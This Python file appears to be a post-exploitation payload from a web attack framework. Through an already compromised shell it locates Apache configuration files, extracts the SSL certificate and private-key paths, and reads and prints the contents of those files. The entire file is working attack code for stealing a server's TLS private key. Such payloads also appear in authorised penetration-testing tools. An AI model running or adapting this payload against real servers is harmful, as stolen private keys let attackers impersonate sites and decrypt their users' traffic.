import re
from plugins.attack.payloads.base_payload import base_payload

class apache_ssl(base_payload):
    '''
    This payload shows Apache SSL Certificate & Key
    '''
    def api_read(self):
        result = {}
        result['apache_ssl_certificate'] = {}
        result['apache_ssl_key'] = {}
        

        def parse_ssl_cert (apache_config):
            cert = re.search('(?<=SSLCertificateFile)(?! directive)    (.*)', apache_config)
            if cert:
                return cert.group(1)
            else:
                return ''

        def parse_ssl_key (apache_config):
            key = re.search('(?<=SSLCertificateKeyFile )(.*)', apache_config)
            if key:
                return key.group(1)
            else:
                return ''


        apache_files = self.exec_payload('apache_config_files')['apache_config']
        for file in apache_files:
            content = self.shell.read(file)
            if parse_ssl_cert(content) != '':
                cert_content = self.shell.read(parse_ssl_cert(content))
                if cert_content:
                    result['apache_ssl_certificate'].update({parse_ssl_cert(content):cert_content})
            if parse_ssl_key(content) != '':
                key_content = self.shell.read(parse_ssl_key(content))
                if key_content:
                    result['apache_ssl_key'].update({parse_ssl_key(content):key_content})
        return result
    
    def run_read(self):
        hashmap = self.api_read()
        result = []
        
        for file, content in hashmap['apache_ssl_certificate'].iteritems():
            result.append('-------------------------')
            result.append(file)
            result.append('-------------------------')
            result.append(content)
        for file, content in hashmap['apache_ssl_key'].iteritems():
            result.append('-------------------------')
            result.append(file)
            result.append('-------------------------')
            result.append(content)
        
        if result == [ ]:
            result.append('Apache SSL configuration files not found.')
        return result
